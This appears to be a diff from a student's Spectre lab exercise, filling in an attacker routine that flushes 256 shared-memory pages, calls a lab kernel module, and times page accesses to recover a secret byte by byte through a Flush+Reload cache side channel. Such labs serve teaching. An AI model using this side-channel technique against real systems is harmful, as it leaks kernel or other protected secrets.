@@ -29,6 +29,13 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+void clean_shared_memory_from_tlb(char *shared_memory) {
+    for (size_t i = 0; i < 256; i++)
+    {
+        clflush(shared_memory + (4096*i));
+    }
+}
+
 /*
  * run_attacker
  *
@@ -44,7 +51,18 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
-
+        int min = 100000;
+        clean_shared_memory_from_tlb(shared_memory);
+        call_kernel_part1(kernel_fd, shared_memory, current_offset);
+        int tmp;
+        for (int i = 0; i < 256; i++) {
+            tmp = time_access(shared_memory + (4096 * i));
+            if (tmp < min) {
+                min = tmp;
+                leaked_byte = i;
+            } 
+        }
+     
         // [Part 1]- Fill this in!
         // Feel free to create helper methods as necessary.
         // Use "call_kernel_part1" to interact with the kernel module
